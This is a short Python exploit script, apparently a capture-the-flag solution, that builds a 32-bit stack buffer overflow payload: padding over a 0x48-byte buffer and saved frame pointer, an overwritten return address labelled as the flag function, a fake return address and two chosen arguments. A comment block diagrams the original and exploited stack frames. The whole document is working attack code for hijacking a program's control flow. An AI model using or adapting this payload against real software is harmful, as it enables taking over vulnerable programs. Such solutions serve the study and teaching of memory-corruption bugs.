from struct import pack


message = "A" * (0x48 + 4)
message += pack("<I", 0x5655629b)
message += "AAAA"
message += pack("I", 0x2485)
message += pack("I", 0xff89)
print(message)


'''

Original Stack Frame
|----------------|
|     ...        |
|     ret        |  <- ebp + 0x4
|     ebp        |  <- ebp
|     local1     |  <- ebp - 0x4
|     buff       |  <- ebp - 0x48
|----------------|                   


Exploited Stack Frame
|----------------|
|     arg2       |
|     arg1       |
|     fake ret   |
|     ret        |  
|     ebp        |  
|     local1     |  
|     buff       |  
|----------------|                   

A * 0x48     <- local variables
A + 4        <- old ebp
0x5655629b   <- flag address
A + 4        <- fake ret
0x2485       <- arg1
0xff89       <- arg2
'''
